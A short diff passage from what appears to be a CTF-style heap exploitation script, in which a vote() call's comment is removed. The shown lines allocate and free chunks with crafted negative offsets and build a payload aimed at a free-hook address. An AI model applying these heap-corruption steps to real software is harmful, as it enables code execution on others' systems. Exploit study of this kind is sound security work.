@@ -134,7 +134,7 @@ vote('aaaa', "x"*0x28, 0) # free bottom side 0x20 chunk
 if args.R:
     vote('b', "X"*0x28, -0x1590+OFFSET) # get two 0x20 sized chunk with reverse position
 else:
-    vote('b', "X"*0x28, -0x1590) # get two chunk and save this vote
+    vote('b', "X"*0x28, -0x1590)
 payload = 'a'*0x20 + p64(fh-8).strip('\x00')
 vote(payload, "hoge", 0) # insert payload to name
 
